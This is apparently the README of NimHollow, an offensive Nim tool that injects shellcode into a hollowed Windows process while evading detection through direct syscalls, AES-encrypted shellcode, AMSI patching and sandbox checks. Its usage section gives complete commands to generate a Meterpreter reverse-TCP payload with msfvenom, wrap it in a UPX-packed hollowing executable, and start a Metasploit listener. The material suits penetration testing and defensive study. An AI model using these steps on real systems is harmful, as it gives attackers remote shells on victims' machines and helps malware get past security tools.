NimHollow
==========

Playing around with the [Process Hollowing](https://attack.mitre.org/techniques/T1055/012/) technique using Nim.

Features:

* Direct syscalls for triggering Windows Native API functions with [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers).
* Shellcode encryption/decryption with [AES in CTR mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#Counter_(CTR)).
* AMSI patching with @rasta-mouse's [method](https://rastamouse.me/memory-patching-amsi-bypass/).
* Simple sandbox detection techniques from the OSEP course by @offensive-security.

## Usage

Installation:

```console
~$ git clone --recurse-submodules https://github.com/snovvcrash/NimHollow && cd NimHollow
~$ sudo apt install upx -y
~$ pip3 install -r requirements.txt
```

Example:

```console
~$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.13.13.37 LPORT=31337 EXITFUNC=thread -f raw -o shellcode.bin
~$ python3 NimHollow.py shellcode.bin -i 'C:\Windows\System32\calc.exe' -o hollow --upx --rm
~$ file hollow.exe
hollow.exe: PE32+ executable (console) x86-64 (stripped to external PDB), for MS Windows
~$ sudo msfconsole -qr msf.rc
```

Help:

```
usage: NimHollow.py [-h] [-i IMAGE] [-o OUTPUT] [--debug] [--upx] [--rm] shellcode_bin

positional arguments:
  shellcode_bin         path to the raw shellcode file

optional arguments:
  -h, --help            show this help message and exit
  -i IMAGE, --image IMAGE
                        process image to hollow (default "C:\Windows\System32\svchost.exe")
  -o OUTPUT, --output OUTPUT
                        output filename
  --debug               do not strip debug messages from Nim binary
  --upx                 compress Nim binary with upx
  --rm                  remove Nim files after compiling the binary
```

## Process Hollowing in Slides

![](https://user-images.githubusercontent.com/23141800/132566686-09dda614-6cb7-46ea-9218-716ce31a7798.png)
![](https://user-images.githubusercontent.com/23141800/132566690-d60e7db0-0370-41ab-85cf-0b0ee8cc50fb.png)
![](https://user-images.githubusercontent.com/23141800/132566771-b7b4a867-3afc-4cb6-8e0d-a722bd683c6b.png)
![](https://user-images.githubusercontent.com/23141800/132566782-f491ac47-cc6e-4298-a9f5-4f283b6246ad.png)

## Credits

* @ajpc500 for the [NimlineWhispers](https://github.com/ajpc500/NimlineWhispers) project.
* @byt3bl33d3r for the [OffensiveNim](https://github.com/byt3bl33d3r/OffensiveNim/) repository.
* @S3cur3Th1sSh1t and @chvancooten for Nim [code](https://github.com/S3cur3Th1sSh1t/Creds/tree/master/nim) [snippets](https://github.com/byt3bl33d3r/OffensiveNim/issues/16).
